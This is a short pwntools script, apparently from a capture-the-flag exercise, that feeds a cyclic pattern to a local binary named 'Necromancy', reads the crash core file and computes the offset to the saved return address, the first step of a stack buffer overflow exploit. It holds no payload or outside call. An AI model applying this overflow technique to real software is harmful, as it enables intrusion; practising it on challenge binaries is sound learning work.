from pwn import *
context.arch = 'amd64'

p = process('./Necromancy')
p.recvuntil(b'Bring back the dead')
p.send(cyclic(400))          # паттерн вместо 'A'*256
p.wait()

core = p.corefile
rip = core.read(core.rsp, 8)
log.info("offset = %d", cyclic_find(rip))